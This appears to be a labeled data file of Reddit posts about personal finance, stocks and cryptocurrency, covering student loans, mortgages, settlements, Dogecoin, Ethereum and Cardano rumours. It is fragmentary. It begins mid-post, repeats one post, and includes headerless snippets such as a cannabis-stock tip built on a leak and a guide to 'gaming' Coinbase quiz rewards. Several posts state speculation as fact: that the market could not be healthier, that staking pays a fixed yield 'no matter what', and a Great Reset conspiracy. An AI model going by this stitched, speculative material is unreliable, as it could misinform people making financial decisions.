Because I was on automatic payments, at that moment I didn't realize my payments had gone up, so hearing this came as a shock.  I went and checked and sure enough, my last payment was $1467.

Do I apply to a few different lenders and then choose the best one? Is that how you approach this situation? Will that have any effect if by for some reason I get rejected and then I have to use the dealership financing?

My understating is that if I apply for loans of the same category on the same day, I will only take one credit hit, is that correct? So Do I apply to everyone? That doesn't sound right.

I was doing my taxes and was looking for a 1098T for 2020, couldn't find it, so I called the school I received the degree from. Turns out my final semester, Spring 2020, was paid for by Fall 2019 loans. No 1098T for me because no tuition was actually paid in 2020. This got lost in translation somewhere and I was STILL given the loan for my Spring semester, even though it was already paid for. So when I was on the phone asking for my 2020 1098T that doesn't exist, the financial services gal mentioned that I have roughly $12k in credits on my university account. (WHAT?) She explained that I should contact the financial aid department to see if I could get the loan reversed since it wasn't used for tuition, so I did. Turns out I took too long to realize it and financial aid can't reverse it anymore, they can only refund it back to me.

&amp;#x200B;

So now I'm wondering what my next best steps are. My only option through university is to have the $12k direct deposited or sent via check to me. What should I do with this money? Should I send it straight back to my student loan servicer and take that chunk of my loans away? Or should I use it to pay off my CC completely and begin to focus my debt repayment solely on my student loans? Is that even allowed? My lizard brain tells me this is the smart(ish) thing to do since the interest rates are significantly higher.

&amp;#x200B;

Something else worth mentioning, I currently work for a 501c3 that qualifies for the PSLF program. My plan is to just make regular payments on the student loan for 10 years and have it wiped after. I like my job and my field. 

&amp;#x200B;

Any guidance is incredibly appreciated. Be gentle, I'm fragile! Thank you thank you thank you.",finance

CryptoCurrency,Earning interest on a stablecoin,"Hi all,

I have some money left that I don't feel like investing in ETH (or another cryptocurrency) right now, but in my bank account it's currently getting 0.01% interest rate. That's ridiculous. So I am looking for something to put my money in with no risk of it losing value (since I might need it next year or so). 

I heard things like DeFi and yield farming, but I'm stil pretty new to that world. What are my options when it comes to getting interest on a stablecoin?

Kraken offers a 1.5% interest, but I don't feel comfortable leaving money on a centralized platform. Preferably I want to store them on my Ledger (Nano S) where I control my keys.

First thing that I thought of was DAI, but it seems like you need an Ethereum collateral or something

CryptoCurrency,"Unpopular opinion, we need to be careful. This bull run could end the Wild West of Crypto.","When the dot com bubble happened a lot of very inexperienced people jumped into the stock market and lost their shirts. This will happen with Doge and possibly a dozen other hype fueled coins. 

Many people who go in early, many people here, may get rich if they get out before the fall.  We are the lucky ones. But there will be countless more who were convinced it was the path the glory and they’ll FOMO into something like DOGE at $0.70 or $1.00 or $2.00 or $5.00 and a few months later they’ll have 1/10th or 1/100th of their initial investment. 

Those people will miss out on the logarithmic gains that we all saw today and they will be scared and they will panic once they start seeing their rent check disappear. And yes this is their fault but desperate people do desperate things and most people need more money right now, so the promise of crypto is very very tempting. And realistically, people won’t put money just into DOGE...they’ll put it into anything they think is cheap, anything that they think will explode. We will probably see a ton of highly centralized, pre-mined, ICO coins blow up in the next few weeks and to an outside observer it’ll look like wave after wave of pump and dumps.

And if we get to that point then there will be calls for regulations. Calls to stop letting people like Musk manipulate crypto just like there were calls to make him stop manipulating the stock market. There will be inquiries into all of the other projects that crash too. Worst case a bunch of very enthusiastic, hopeful and now fearful retail traders will crash this entire ecosystem (temporarily of course). 

And if that happens the SEC and other federal entities will start cracking down on this space. They’ll have no choice. There are too many institutional investors in BTC who will lobby and pressure congress and regulators to stabilize these markets. We’ll eventually have a great regulatory filter that kills off the high risk coins and those which look too much like securities and it’ll happen sooner rather than later if a ton of small investors lose a lot of money. 

And that’ll be that. The Wild West days of crypto could soon be over if this little meme coin starts a domino effect of pain.

personalfinance,Crazy 529 college plan idea,"I'm just learning about 529s, so forgive me if I'm missing something obvious, but I am curious on leveraging one for the below idea.

The idea - open a 529 for myself and use that account to pay off my student loans. Make minimum payment each month. This way I can invest money for my student loans and not pay taxes on gains. This is especially attractive with the loan forbearance currently in place. I have no children but want to someday, so I wouldn't want to do this if it would impact me down the road.

My details: I have about $10K in student loan debt with an average interest rate of ~4%. I have never paid more per month than the minimum due. I have $20K in a brokerage account and max out retirement accounts each year. So I could pay it in full if I wanted but the 4% interest is cheap money and I prefer to have high liquidity net worth.

I also have about $1,000 in government savings Bonds I can cash in to use for the loans. Is there a way I could cash these out and put them in a 529 and avoid capital gains?

I currently have an AGI above $80K and so I am unable to write off the interest paid on the loans or avoid paying capital gains on the bonds as part of the education exclusion for government bonds.

Thanks for any advice and hearing out my idea. With loan forbearance in place I feel like this might be a great strategy for a lot of people who currently have federal student loans.",finance

stocks,"The market is perfectly healthy, and not about to drop, or have a large correction like everyone suspects (Hear me out)","I continue to see people being cautious of the markets, and though the vast majority of you will likely disagree with me, and most likely downvote this, just please read through it before hand.

&amp;#x200B;

The market if looked at from a simple graph looks absurd in comparison to previous years, 20% growth even after a crash! however, if compared to previous years this is not 'super uncommon' and still possible like 2013 for example. From this point on when I say the markets I am really just referring to the SPY, since its a simple and accurate portrayal of the overall market imo.

sure, there are some stocks that obviously may crash, and are most certainly going to be argued about if they will crash or not, for example AMC, GME, etc. however, the overall market could not be healthier at the moment, we are currently coming out of a pandemic, and the largest companies are gaining more and more business as the smaller mom-and-pop shops are being forced to close due to a lack of business, while companies like AMZN and WMT have become evermore profitable in 2020 (while this may not be good overall, looking at it from a strictly stock market performance stance, its great news) due to this separation, and allowing big companies to do better, it makes sense the market is growing at such a rate (though maybe the 7-8% in march/April may call for a slight correction). 

companies like CCL, DAL, AAL, and other covid recovery stocks are also improving as their prospects look better going forward, and consumer spending is going to increase as we leave this pandemic behind us. interest rates are extremely low, allowing companies to further increase their profits, and grow as companies, in not creating crazy overvalued companies (there are obvious exceptions)

I see many people worried about inflation, and showing various graphs that have flaws, such as the M1 graph I believe I saw on the home page here, or maybe on a similar subreddit, hinting that there is far too much money in circulation right now, but that graph has only gone up so much because of the shift from M1 not including savings accounts to now including them.

Furthermore, comparing it to the 2000 bubble is not even fair, the 2000 bubble had seen at least 230% growth in the 5 years leading up, we have only seen around 100%. during the 2000 bubble, nobody thought the market would crash, and continue the increase, during this current market however, things couldn't be more different, everyone is trying to guess what will cause the market crash, you see it all over the news, on CNBC, barrons, and then in all the investing subreddits, trying to predict the next market crash. there are no crappy loans like in 2008, and again, like in 2008 nobody really assumed a crash, and everyone assumed house prices would just increase, however that couldn't be more different today, (with the stock market I mean). 

I believe this has just been an exceptionally good year, and may continue until 2022 or 2023 even, or may slow down soon, and just consolidate, but personally, I don't see a large drop like everyone is suggesting. If you disagree, that's up to you, but for the love of god, please stop putting graphs that don't prove anything about a crash coming, I've seen 3 different graphs posted make trending, trying to indicate a crash is coming, which I believe are unrelated, or are exaggerated.",finance
CryptoCurrency,Best way to move fiat from kraken to binance.,"So I sold some doge on kraken for the first time. Tried to withdraw via their only way of withdrawal which is wire transfer. 

It got denied due to my banks routing number not supporting fedwire. They suggested I talk to bank as they might have different routing number for fedwire. 

My bank said they go through a beneficiary bank. So I would need to wire to beneficiary bank and then that bank wires it to my bank who sends it to me. Obviously I can't do this. 

So how would I go about moving fiat to binance from kraken? Is there a stable coin that I can send from kraken to binance?

Huge hassle that my credit union doesn't do wire transfers straightforward even bigger hassle that Kraken doesn't do ach or straight to debit card like binance. If I knew this I wouldn't have signed up to kraken.

personalfinance,"Auto Settlement arriving next week, what do I do?","Ok so this is complicated, but I got good news. The auto accident and ensuing insurance claim from last August finally settled and I'm getting $32,000 next week. My auto insurance gave me replacement value on my totaled car within a couple weeks, I got a car for less than the replacement value, so I didn't have to pay anything out of pocket, and that's all squared away. 8 months later, the other driver's insurance (ruled at-fault) is giving me a $32,000 settlement for pain and suffering. I'm trying to figure out what to do with the money, and there are tons of factors to weigh. Too many for me to process quickly.

Current debts:

8,500 on a credit card, 17% interest rate.

50,000ish in student loans, all between 4.5-5.5% interest rate.

Closing on a house in 3 weeks, 155,000 mortgage, 3.375% interest rate.

&amp;#x200B;

Assets:

8000 in my 403b retirement account

9000 as an emergency fund in savings

closing on a 162,000 house 

&amp;#x200B;

Goals/options/initial thoughts:

Wipe out the credit card debt, blank slate for that will feel so relieving. 

Don't do anything to the student loans, the interest rate is lower than the average ROI from investing, so continue just to may my standard monthly payments.

Get to 20% principal paid on the house to remove PMI payment, and the way amortization schedules work I think this would reduce the amount of interest paid over the life of the loan by almost 40,000? Doing this would take up all the money though.

My wife's car is an '09 Camry, 120k miles, we had to put 3k worth of work into it last summer, and now it's got a check engine light and something rattling. Fix the car or replace it? It's fully paid off, but I think I might be starting to sink too much money into the maintenance. 

Buy myself and my wife macbooks. Neither of us have had functional personal computers in over 4 years, we've been using work computers, and for all our creative projects have had to stay at work or go to a friend's house to do the various music/photography projects we're involved in.

Start investing. I have a 403b retirement account that I contribute 5% of my paycheck to, and it's matched 2.5% by my employer. That's in pretty good shape for my long-term investing, some shorter-term higher-risk investments might be a wise choice. 

Buy solar panels for my new house and have the new car I buy be an electric vehicle, to both be more eco friendly and reduce utility and transportation payments.

&amp;#x200B;

Questions:

Is this settlement going to be taxed? Either immediately, or next year on my income tax filing?

What would be the biggest missed opportunity?

&amp;#x200B;

The last time I posted about weed stocks, I explained how US cannabis stocks (ie Trulieve/Cresco/Greenthumb/Curaleaf) are all awaiting big legislative changes throughout the year.

I'm posting now, because the first big piece of legislation, the SAFE act, is finally being introduced to Congress next week.

&gt;The message, which was sent to stakeholders on Friday by a staffer for Rep. Ed Perlmutter (D-CO), the bill’s sponsor, says that while the office is still awaiting scheduling confirmation, they “think the bill will be on the House floor for a vote early next week,” and that will be confirmed when the full calendar is released by House Majority Leader Steny Hoyer (D-MD) “later today.”

SAFE act is a game-changer US MSOs that currently bleed absurd amounts of money and resources because of harsh federal banking restrictions.

&gt;The legislation would ensure that financial institutions could take on cannabis business clients without facing federal penalties. Fear of sanctions has kept many banks and credit unions from working with the industry, forcing marijuana firms to operate on a cash basis that makes them targets of crime and creates complications for financial regulators.

As this news has been confirmed by a fresh leak (that was only published within the hour I'm making this post) there is an opportunity to buy the *""rumour""* in sense as the market has yet to react today.

Each component of Lucky Cat has a handful of possible options (ears, eyes, mouth, etc), with certain traits being more rare than others. I then wrote a Javascript script whichI fed through Photoshop to randomly select which layers/colors/backgrounds were chosen and it generated a random, completely unique Lucky Cat ([A small video of a few Cats being generated](https://twitter.com/RoskoFriends/status/1370742431956750338)).

personalfinance,Should I pay off my mortgage?,"I own a $300,000 house, but (long story short) I only owe $52,000 on a mortgage with about 28 years left to go.  My mortgage interest rate is 5%.  I am currently paying about $220 in interest and $80 in principal with each payment, and expecting to pay over $40,000 in interest on that mortgage.  

On the flip side, I have a savings account with about $54,000 in it.  Its an online account making a very low interest rate (0.3%).  I use this account as an emergency fund, and for making major purchases (cars, appliances, vacations).  This savings account usually fluctuates between $30,000 and $50,000 as I go about life making major purchases.  Right now, I am adding $2,200 to my savings account each month.  I don't finance my cars. I like to make major purchases with cash and not go into dept with every major purchase.  I also put savings into a 401(k) for long term investment and retirement, I am not going to touch that money.

So, should I pay off my mortgage?  I could pay it off right now!  I would almost completely deplete my emergency fund and capacity for major purchases, however, I would immediately begin refilling that savings account at an even faster rate, approximately $2,500 per month.  If my car breaks down the day after I pay off the mortgage, I would have to finance the repair, but I would be able to pay that off in a matter of weeks as I replenish my savings.  If I need to buy an entire new car, well, I could just finance it for a while, like everyone else does.  But if nothing goes wrong, I will have a big healthy savings account again in less than a year.  I do not plan to put my savings into any other investments that would outperform the interest on the mortgage, so I think the best thing for me to do is to just pay off the mortgage as soon as I can, so that I can keep more of my money.  I am just not sure if it is wise to use my emergency fund for that... maybe I need to grow my savings account to about $70,000 before pulling this trigger.  I don't know.

stocks,"Here is a Market Recap for today Friday, April 16, 2021","**PsychoMarket Recap - Friday, April 16, 2021**

Stocks traded higher on Friday, continuing momentum from yesterday’s record-setting close, with a batch of better-than-expected economic and corporate earnings results fueling the recent rally. The S&amp;P 500 (SPY) and Dow Jones (DIA) set fresh intraday records while the tech-heavy Nasdaq (QQQ) traded mostly flat. 

According to a report by the US Department of Commerce, retail sales boomed 9.8% higher in the month of March as the economy continues to gradually reopen as more vaccines are distributed. Moreover, the Weekly Unemployment report showed first-time unemployment claims plunged far below analyst estimates. The Labor Department reported 576,000 new jobless claims for the week ending April 10. This represents the lowest total first-time unemployment claims filed since August 2020 and a sharp decline from both the previous week’s total of 769,000 and analyst expectations of 710,000. 

This is great news on two fronts. First, consumer spending represents 70% of US GDP ([more info here](https://www.thebalance.com/components-of-gdp-explanation-formula-and-chart-3306015#:~:text=Consumer%20spending%20comprises%2070%25%20of,components%20of%20the%20U.S.%20economy.)) and is a key driver of economic growth. GDP is now expected to increase 6.5% in 2021 according to the Federal Open Market Committee, the central bank's monetary policy-making group. That is sharply higher than the 4.2% forecast made in December of 2020. Second, Jerome Powell and other FOMC members have reiterated that recovery in the labor market “remains uneven and far from complete”. To see a report blow so far past analyst expectation is a great sign the labor market is recovering in tandem with the surge in consumer spending. 

Michael Pearce, senior US economist for Capital Economics said of the consumer report, “What caught our eye was the 13.4% surge in spending on food and drink services, while clothing store sales were up by 18.1%. Relative to pre-pandemic levels, food and drink services sales are down just 5.1%, while clothing store sales are now higher than they were in February 2020. That suggests a combination of loosening restrictions and easing of virus fears linked to the vaccine rollout are driving a rapid return to normalcy.” 

Distribution of the Johnson and Johnson (JNJ) coronavirus vaccine remains paused in the US following reports of rare blood clots in people who received the vaccine. The agencies are reviewing data over six reported U.S. cases of a severe blood clot in individuals after receiving the vaccine, and have recommended the pause ""out of an abundance of caution,"" the FDA said in a Twitter post. To date, roughly 6.8 million doses of the single-dose JNJ vaccine have been administered.

XRP,The Great Reset,"What do you think about the great reset? I hate watching those stupid youtube channels like moon lambo and the other ridiculous offenders, but one recently caught my attention. He was talking about the great reset and how xrp is going to take over as a global currency. Ripple has teamed up with the world economic forum. Obviously those at the top are not going to relinquish their power and certainly their thirst for more power will come into play. With the fed continually printing money, the usd is losing its value. The amount of spending the federal government is doing is not sustainable. Do you think they're trying to crash the global economy for the great reset and then using xrp as a global currency?",cryptocurrency

personalfinance,Over Disbursement of Graduate Student Loan,"I posted this here this morning, but would love a bit more input so I am posting it again. I don't mean to spam, just want as much information as I can get.

 [Link to my original post](https://www.reddit.com/r/personalfinance/comments/ms71o5/over_disbursement_of_graduate_student_loan/)

Howdy, throwaway for reasons. Before I go into my story, I do want to make it known that I understand how much debt I have and would love to not be shamed for it! Big, looming, towering stacks of lifelong debt, yay.

Current debt situation: 1 year post Master's. I currently have roughly $140k in student loan debt including some undergrad loans, interest between 5% and 7%. Have about $7k in CC debt due to some bad choices in my early 20's, interest between 13% and 21%. Also have a car loan with about $15k left, 3% interest.

I was doing my taxes and was looking for a 1098T for 2020, couldn't find it, so I called the school I received the degree from. Turns out my final semester, Spring 2020, was paid for by Fall 2019 loans. No 1098T for me because no tuition was actually paid in 2020. This got lost in translation somewhere and I was STILL given the loan for my Spring semester, even though it was already paid for. So when I was on the phone asking for my 2020 1098T that doesn't exist, the financial services gal mentioned that I have roughly $12k in credits on my university account. (WHAT?) She explained that I should contact the financial aid department to see if I could get the loan reversed since it wasn't used for tuition, so I did. Turns out I took too long to realize it and financial aid can't reverse it anymore, they can only refund it back to me.

So now I'm wondering what my next best steps are. My only option through university is to have the $12k direct deposited or sent via check to me. What should I do with this money? Should I send it straight back to my student loan servicer and take that chunk of my loans away? Or should I use it to pay off my CC completely and begin to focus my debt repayment solely on my student loans? Is that even allowed? My lizard brain tells me this is the smart(ish) thing to do since the interest rates are significantly higher.

Something else worth mentioning, I currently work for a 501c3 that qualifies for the PSLF program. My plan is to just make regular payments on the student loan for 10 years and have it wiped after. I like my job and my field.

Any guidance is incredibly appreciated. Be gentle, I'm fragile! Thank you thank you thank you.",finance

That sucks, and i definitely understand your concerns, since i am more or less in the same boat. Whatever you plan to do though, **NO DOWN PAYMENT IS NECESSARY TO GET STARTED ON BUYING AND SELLING DOGE. WE CAN STILL GO TO THE MOON.** One quick-method involves opening a Bittrex  and Coinbase account and then exploiting Coinbase's rewards. The second method requires you to at least have a PROFITABLE gaming rig for mining, but you may want to skip this: ***GPU mining is only as profitable as your power-bill.***  **The best method will involve using both mining and the rewards from coinbase.**

&amp;#x200B;

# METHOD 1- EASY AND FREE, NO MINING REQUIRED (easiest and fastest method for noobs):

Did you know that  coinbase will just give you free altcoins!? it's true, all you have to do is watch those awful Alegria-art videos and answer the quiz questions. The best part is this: YOU DON'T EVEN HAVE TO WATCH THE ENTIRE VIDEO OR ANSWER CORRECTLY, THEY GIVE YOU MULTIPLE FREE TRIES. Here is how you can ""game"" their system.

* &amp;#x200B;

1. Open a Coinbase account, you can claim free rewards. Verification is relatively quick, especially when compared to binance.us.

* 2. Open a Bittrex account. Again, you will Get verified way quicker than you would with Binance.us. ( seriously, fuck binance.)
* 3. Claim your coinbase Rewards through their Quiz system ( about 30USD). In about an hour or less you can make up to 30 bucks. THERE MAY BE A LIMIT, but even 5 dollars of doge will be better than zero Doge.
* 420. Convert your coinbase rewards to BTC.
* 5. Deposit your BTC to Bittrex. This will take anywhere from 30 minutes to an hour. DOUBLE CHECK YOUR ADDRESSES, DEAR EGOD I CAN NOT STRESS THIS ENOUGH.
* 69. Buy doge with your BTC on Bittrex.
* 7.  THATS IT. 42069 IT AND HODL UNTIL WE GO BEYOND THE MOON.

To maximize your money, consider placing limit buys/orders on Bittrex so you can nab the dips when Whales and FUD'ers sell off.

# METHOD 2:  How to mine Dogecoin without actually mining DOGE. (somewhat advanced. takes about one week with an RTX2070 or similar card)

**This requires TIME and for you to have a Gaming PC capable of PROFITABLY mining with Nicehash. T**here are different requirements depending on your hardware.

  
FOR ALL USERS:

* 1. Go to Nicehash.com
* 2. Enter your system specs and Cost per KWH, into their profit calculator.
* 3. Is it profitable? If no, then use METHOD 1.   If yes, then sign up and download the program that best suits your hardware.
* 420.  Let your rig mine until you hit the minimum withdrawal limit for your chosen wallet ( coinbase transfers require a minimum of 0.0005 BTC, and Bittrex requires 0.001BTC,  You can always wait longer or just transfer from CB to Bittrex once you hit the withdrawl limit.)

For NVIDIA users:

1. Download Nicehash Quickminer. Make sure drivers are up to date.
2. Let your rig mine until you hit the minimum withdrawl limit. You can always wait longer.

Pro tip: Maximize profits with their Auto-OC features. For now, i am able to get my bottom-of-the-barrel RTX2070 to run at 40-42 MH/s when optimized for speed. Optimize for efficiency if you want to maximize profits.  Pascal/10 series GPU's can not use this, so you will have to manually overclock.  


For AMD Users:

1. Download the latest STABLE nicehash program.  DO NOT USE QUICKMINER
2. Run  the program and mine Until you meet the minimum withdraw limit.

And that's it my Shibe-bro's! Now you are mining AND investing with your own money, and you just got 30 USD in altcoins for free!

CryptoCurrency,Ethereum Explained for Noobs,"**The Basics of Ethereum (ETH)**

Ethereum’s purpose is to be a decentralized monetary system. It is one of the most versatile cryptocurrencies with many forms of utility, including: smart contracts, defi, and dapps. I will try to explain these things in the most simple way possible. This will be based on Ethereum after its two biggest updates are released in the next 1-2 years. (EIP 1559 and ETH 2.0) Ethereum also goes by ETH and ether. 

**Decentralized Apps (dapps)**

One of Ethereum’s biggest use cases is that it can have tokens built on top of it that can perform a variety of functions and tasks. Some of them can be used to borrow and get loans using cryptocurrency, and some can be used to buy/sell stocks on the blockchain. This is known as decentralized finance (defi). Another use for dapps is decentralized exchanges like Uniswap and 1inch token. These can be used to trade ethereum tokens without a middleman, completely decentralized. These trades require ETH (Ethereum) in order to be finalized. These ETH fees are also known as “gas”. 

**Staking**

With a future update known as ETH 2.0, Ethereum will be moving from mining to staking. Not only does this require far less energy, but it will also allow people to earn interest on their ETH. You use your ETH to help secure the network, and in return you receive the reward of interest on your coins. This interest level will likely be between 5-10%, and will scale up if the price of ETH goes up over time. If you stake 1 ETH, and the interest rate is 10%, you will earn 0.1 ETH no matter what, even if the price were to double. (This interest on your ETH comes from the transaction fees that happen every time someone sends ETH to another address.) 

**Smart Contracts**

Smart contracts are probably the most complicated for some people to understand. But it’s basically telling the ETH network that you want it to perform a task if a certain outcome happens. Here’s an example. Let’s say you are going to bet your friend that a certain coin will double in price by the end of the year. You both lock your ETH up in the network, and all of it is given to the person who was correct. Basically a decentralized middleman.

**EIP 1559**

EIP 1559 is a very important ETH update that is expected to roll out within the next few months. Every time someone sends ETH, there is a network fee. Some of this fee will go to the stakers who earn interest on their ETH to secure the network. EIP 1559 will make it so a part of this fee is completely burned, and will never exist. This will drastically lower the ETH’s inflation rate from about 4.5% to around 0.5-1%. Equivalent to multiple bitcoin halvings.

**Gas**

Ethereum has transaction fees known as ""gas"", this is used to do almost everything on the network. Any time you send ETH, use smart contracts, or use a decentralized app; you will be required to pay some of your ETH. While the fee is considered high by some, it is necessary for the network to remain highly secure. (There are many solutions that will likely lower this transaction fee in the future. It is currently about $20, but is expected to be drastically reduced at some point with ETH 2.0 and EIP 1559. ) This transaction fee or ""gas"" is used to pay the stakers that secure the network, and will be partially burned with EIP 1559.",cryptocurrency

I mean the guy has to plan for his future right?

Did you know that the Senate only votes for Gensler to be SEC until June/5. That is when the term ends for this current term, where he succeeded the outgoing head of SEC. If he does a good job! Make some good calls or decisions and gains popularity! Then of course Senate will confirm him after June/5 for another term. A full term as SEC head.

stocks,S&amp;P 500 similarities to 1987. What is your opinion on this?,"&amp;#x200B;

The 1st chart (daily) is a candlestick chart of the S&amp;P 500. The time period shown is between June 1987 - October 1987. The chart consists of 3 up waves (green arrows) + 3 corrective waves (red arrows) before the final double top is put in place (bolded orange box). Once the double top was in place, the S&amp;P 500 proceeded to experience downward price movement until falling 20% on October 19th, 1987.

The 2nd chart (daily) is a candlestick chart of the S&amp;P 500. The time period shown is from November 2020 to April 16th, 2021. Subnani Investment Research, LLC believes the S&amp;P 500 price action is making a similar double top pattern as in mid-August 1987. The firm believes the current pattern emerging consists of 3 similar up waves (green arrows) + 3 corrective waves (red arrows). The firm believes the S&amp;P 500 is in the final process of forming a double-top bearish chart pattern that would lead to downward move in price and potentially a repeat of a double-digit %down day similar to October 19th, 1987.

The 3rd and 4th charts are from the time periods of April 16th, 2021 and October 1987. These charts are zoomed out to display the entire price action of the S&amp;P 500 (candlesticks) and 10-year interest rate (blue line).

Bitcoin,Federal Reserve Chairman Jerome Powell Says Cryptocurrencies Are 'Vehicles for Speculation,,cryptocurrency
Bitcoin,Reflecting on Gensler's MIT Course,"Since Gary Gensler is now the SEC chair and he has that MIT course on blockchains, I figured I'd watch his classes. In 2. Money, Ledgers &amp; Bitcoin starting at about 41:43, he discusses ledgers and general ledgers. I got goosebumps when he says, ""... the master ledger, or general ledger, at the Federal Reserve."" I feel like I could sense that he knows that the beast needs vanquished. I'm eager to continue onward in the lecture series.

Bitcoin has really pulled me in recently. I've been hip since 2012, but throughout this past year have been many events that have compelled me to finally get off 0. Not just that I've bought in, but my spirit has heard a call to action I have never experienced before.

I've been so animated and inspired, but I'm wandering aimlessly. I want to learn programming so I can build tools and hopefully have a positive impact on our community, but am unsure where to begin. I have considered learning Python and have purchased a course on Udemy, but it feels inadequate. I've been discouraged recently because my progress feels hollow.

Is anyone aware of a resource I could utilize they found highly effective? I am more than happy to pay for knowledge, especially if it includes some level of active mentorship or a small group. I can learn on my own, but it's much easier if I don't have to go at it completely solo.

Any help is much appreciated! Thank you!",cryptocurrency
personalfinance,I voluntarily surrendered my vehicle but the creditor is still taking payments from my account.,"So two months ago I gracefully departed the military in 31 flavors of financially goofed. With no savings left and no readily available employment my creditor finally came calling to collect. I had hoped I’d get something figured out before then but I unfortunately could not line anything up. 

The understanding I came to with the loan officer was I’d voluntarily turn my vehicle over to them and it would go to auction and once it was sold I’d pay the difference. Sounded fair, I didn’t hold up my end of the loan so they get to take their toy back and I owe the balance. The credit dent was not that bad at all, but a few weeks later a car payment pulls... 

So I give the creditor a call and he says I will continue making payments until the vehicle sells at auction. I don’t know if this is fair game... it strikes me as odd that they would take regular payments from a source that literally just turned the vehicle over because they couldn’t make the monthly payments. It feels like if they are just going to continue taking regular payments, then just let me take the car back. I know very little about this entire process and I’m pretty sure my creditor knows that too. 

I’m hoping someone here can give me some insight into what’s fair game and what’s foul play when it comes to repo. I’m more than willing to play by the rules, but I’d definitely like to know they are too.",finance

cardano,Cardano Rumor Rundown APR 17 2021,"Hey Everyone!

I've been consuming all the Cardano news and media on a daily basis for years now. I figured it wouldn’t hurt to share a list of what I'm seeing for anyone else who's interested. Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list. 

Check out the youtube companion to today’s post: [https://youtu.be/gJUir6iH8N0](https://youtu.be/gJUir6iH8N0)

Let's go....

Newly covered today: 

1. Now there is an app that will show you all of your Cardano NFTs.  [https://twitter.com/nft\_craze/status/1383196757622878208](https://twitter.com/nft_craze/status/1383196757622878208)
2. As always, we are the github champions this week. [https://twitter.com/ProofofGitHub/status/1383087802305380359](https://twitter.com/ProofofGitHub/status/1383087802305380359)
3. Charles is right about the Doge bubble. If things go badly, this could be the excuse that the regulators use to go after the whole space. [https://www.youtube.com/watch?v=rM9DWe3-glg](https://www.youtube.com/watch?v=rM9DWe3-glg)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Catalyst Fund 3 Voting is ongoing, it looks like the Yoroi team has worked out the voting problem in the Yoroi wallet. [https://twitter.com/YoroiWallet/status/1369050858546200585](https://twitter.com/YoroiWallet/status/1369050858546200585)
4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
5. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
6. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling.

7. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
8. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

19. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)

24. For those learning Haskell/Plutus, check out this awesome one hour video from 2012 with Brian Beckman that introduces monoids and monads in a very non-scary way. [https://www.youtube.com/watch?v=ZhuHCtR3xq8](https://www.youtube.com/watch?v=ZhuHCtR3xq8)
25. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)

